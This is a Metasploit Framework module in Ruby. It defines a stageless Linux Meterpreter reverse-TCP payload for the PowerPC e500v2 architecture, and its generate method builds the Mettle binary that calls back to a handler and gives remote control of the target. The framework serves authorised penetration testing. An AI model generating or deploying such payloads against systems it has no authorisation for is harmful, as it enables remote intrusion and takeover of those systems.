##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_ppce500v2_linux'

module MetasploitModule

  CachedSize = 1165032

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter, Reverse TCP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_PPCE500V2,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::Meterpreter_ppce500v2_Linux
      )
    )
  end

  def generate
    opts = {
      scheme: 'tcp',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('powerpc-e500v2-linux-musl', generate_config(opts)).to_binary :exec
  end
end
